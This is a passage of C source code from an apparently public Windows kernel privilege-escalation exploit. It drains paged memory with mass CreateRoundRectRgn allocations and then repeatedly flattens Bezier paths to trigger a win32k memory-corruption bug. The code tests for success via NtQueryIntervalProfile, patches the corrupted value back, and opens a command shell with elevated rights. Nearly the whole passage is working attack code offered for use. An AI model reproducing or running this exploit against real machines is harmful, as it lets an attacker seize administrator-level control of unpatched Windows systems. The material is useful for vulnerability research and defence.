        PointTypes[PointNum]    = PT_BEZIERTO;
    }

    // Switch to a dedicated desktop so we don't spam the visible desktop with
    // our Lines (Not required, just stops the screen from redrawing slowly).
    SetThreadDesktop(CreateDesktop("DontPanic",
                                   NULL,
                                   NULL,
                                   0,
                                   GENERIC_ALL,
                                   NULL));

    // Get a handle to this Desktop.
    Device = GetDC(NULL);

    // Take ownership of Mutex
    WaitForSingleObject(Mutex, INFINITE);

    // Spawn a thread to cleanup
    Thread = CreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);

    LogMessage(L_INFO, "Begin CreateRoundRectRgn cycle");

    // We need to cause a specific AllocObject() to fail to trigger the
    // exploitable condition. To do this, I create a large number of rounded
    // rectangular regions until they start failing. I don't think it matters
    // what you use to exhaust paged memory, there is probably a better way.
    //
    // I don't use the simpler CreateRectRgn() because it leaks a GDI handle on
    // failure. Seriously, do some damn QA Microsoft, wtf.
    for (Size = 1 << 26; Size; Size >>= 1) {
        while (Regions[NumRegion] = CreateRoundRectRgn(0, 0, 1, Size, 1, 1))
            NumRegion++;
    }

    LogMessage(L_INFO, "Allocated %u HRGN objects", NumRegion);

    LogMessage(L_INFO, "Flattening curves...");

    for (PointNum = MAX_POLYPOINTS; PointNum && !Finished; PointNum -= 3) {
        BeginPath(Device);
        PolyDraw(Device, Points, PointTypes, PointNum);
        EndPath(Device);
        FlattenPath(Device);
        FlattenPath(Device);

        // Test if exploitation succeeded.
        NtQueryIntervalProfile(ProfileTotalIssues, Interval);

        // Repair any damage.
        *Interval = SavedInterval;

        EndPath(Device);
    }

    if (Finished) {
        LogMessage(L_INFO, "Success, launching shell...", Finished);
        ShellExecute(NULL, "open", "cmd", NULL, NULL, SW_SHOW);
        LogMessage(L_INFO, "Press any key to exit...");
        getchar();
        ExitProcess(0);
    }

    // If we reach here, we didn't trigger the condition. Let the other thread know.
    ReleaseMutex(Mutex);
    WaitForSingleObject(Thread, INFINITE);
    ReleaseDC(NULL, Device);

    // Try again...
    LogMessage(L_ERROR, "No luck, run exploit again (it can take several attempts)");
    LogMessage(L_INFO, "Press any key to exit...");
    getchar();
    ExitProcess(1);
}

// A quick logging routine for debug messages.
BOOL LogMessage(LEVEL Level, PCHAR Format, ...)
{
    CHAR Buffer[1024] = {0};
    va_list Args;

    va_start(Args, Format);
        vsnprintf_s(Buffer, sizeof Buffer, _TRUNCATE, Format, Args);
    va_end(Args);

    switch (Level) {
        case L_DEBUG: fprintf(stdout, "[?] %s\n", Buffer); break;
        case L_INFO:  fprintf(stdout, "[+] %s\n", Buffer); break;
        case L_WARN:  fprintf(stderr, "[*] %s\n", Buffer); break;
        case L_ERROR: fprintf(stderr, "[!] %s\n", Buffer); break;
    }

    fflush(stdout);
    fflush(stderr);

    return TRUE;
}
